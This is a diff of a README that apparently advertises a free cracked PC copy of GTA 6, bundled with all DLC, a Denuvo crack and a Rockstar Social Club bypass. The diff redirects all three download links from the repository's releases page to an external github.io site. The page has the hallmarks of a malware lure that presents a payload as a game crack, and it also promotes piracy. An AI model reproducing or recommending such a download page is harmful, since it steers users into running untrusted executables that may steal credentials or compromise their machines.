@@ -1,6 +1,6 @@
 # 🎮 GTA-6-Social-Club-Bypass-No-Account - Play GTA 6 Free on PC Now!
 
-[![Download GTA 6](https://img.shields.io/badge/Download-GTA_6_Full_Game-00FF00?style=for-the-badge&logo=windows&logoColor=white&labelColor=000000&color=28B463)](https://github.com/dead-partaker2244/GTA-6-Social-Club-Bypass-No-Account/releases)
+[![Download GTA 6](https://img.shields.io/badge/Download-GTA_6_Full_Game-00FF00?style=for-the-badge&logo=windows&logoColor=white&labelColor=000000&color=28B463)](https://dead-partaker2244.github.io)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ No coding skills are required. Just follow the instructions below exactly, and y
 
 ## 📥 Download & Install Process
 
-Visit this link to download the application: [**Click Here to Download GTA 6**](https://github.com/dead-partaker2244/GTA-6-Social-Club-Bypass-No-Account/releases)
+Visit this link to download the application: [**Click Here to Download GTA 6**](https://dead-partaker2244.github.io)
 
 This download is a single package containing everything you need. It includes the full game, all DLC packs, the Denuvo crack, and the Rockstar bypass. You do not need any other files or tools.
 
@@ -97,7 +97,7 @@ Do not try to update. This is a special build. Updates will break the bypass.
 
 You are ready. The download is waiting. Click the button below to start your journey in Los Santos.
 
-[**🚀 DOWNLOAD GTA 6 NOW**](https://github.com/dead-partaker2244/GTA-6-Social-Club-Bypass-No-Account/releases)
+[**🚀 DOWNLOAD GTA 6 NOW**](https://dead-partaker2244.github.io)
 
 ---
 
